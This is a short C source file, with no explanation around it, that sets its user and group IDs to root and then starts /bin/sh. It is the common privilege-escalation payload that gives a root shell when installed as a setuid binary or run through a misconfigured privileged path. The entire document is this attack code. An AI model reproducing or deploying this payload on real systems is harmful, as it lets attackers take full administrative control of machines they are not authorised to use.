#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
